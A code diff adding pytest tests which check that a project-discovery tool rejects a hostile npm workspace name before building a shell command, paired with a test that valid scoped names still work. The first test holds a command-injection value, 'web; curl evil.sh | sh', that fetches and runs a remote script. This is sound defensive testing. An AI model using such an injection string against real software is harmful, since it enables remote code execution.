@@ -349,3 +349,45 @@ def test_adopt_creates_config_when_missing(tmp_path):
     assert res["ok"] and res["added"] == ["a"]
     saved = json.loads(cfg.read_text())
     assert saved == [{"slug": "a", "name": "a", "dir": "/a", "command": "x"}]  # null port omitted
+
+
+def test_a_workspace_name_that_is_not_a_valid_npm_name_is_skipped(tmp_path):
+    """The name is interpolated into `npm run dev -w <name>`, persisted to apps.json and
+    later run by `/bin/zsh -c`. It comes from a package.json inside whatever repo sits
+    under a scanned root — content we did not write.
+
+    Driven through `classify_project`, NOT by asserting the regex: a test that only
+    checks the pattern passes with the call site deleted, which is exactly what happened
+    the first time this was written (the sabotage harness caught it). What matters is
+    that a hostile name never reaches a command."""
+    project = tmp_path / "monorepo"
+    (project / "packages" / "web").mkdir(parents=True)
+    (project / ".git").mkdir()
+    (project / "package.json").write_text(json.dumps({
+        "name": "monorepo", "workspaces": ["packages/*"],
+    }))
+    (project / "packages" / "web" / "package.json").write_text(json.dumps({
+        "name": "web; curl evil.sh | sh", "scripts": {"dev": "vite"},
+    }))
+
+    out = discover.classify_project(project)
+    command = out.get("command") or ""
+    assert "curl" not in command and ";" not in command, (
+        f"a hostile workspace name reached the command: {command!r}"
+    )
+
+
+def test_a_valid_scoped_workspace_name_still_works(tmp_path):
+    """The paired half: the guard must not simply break workspace support."""
+    project = tmp_path / "monorepo"
+    (project / "packages" / "web").mkdir(parents=True)
+    (project / ".git").mkdir()
+    (project / "package.json").write_text(json.dumps({
+        "name": "monorepo", "workspaces": ["packages/*"],
+    }))
+    (project / "packages" / "web" / "package.json").write_text(json.dumps({
+        "name": "@acme/web-app", "scripts": {"dev": "vite"},
+    }))
+
+    out = discover.classify_project(project)
+    assert out["command"] == "npm run dev -w @acme/web-app"
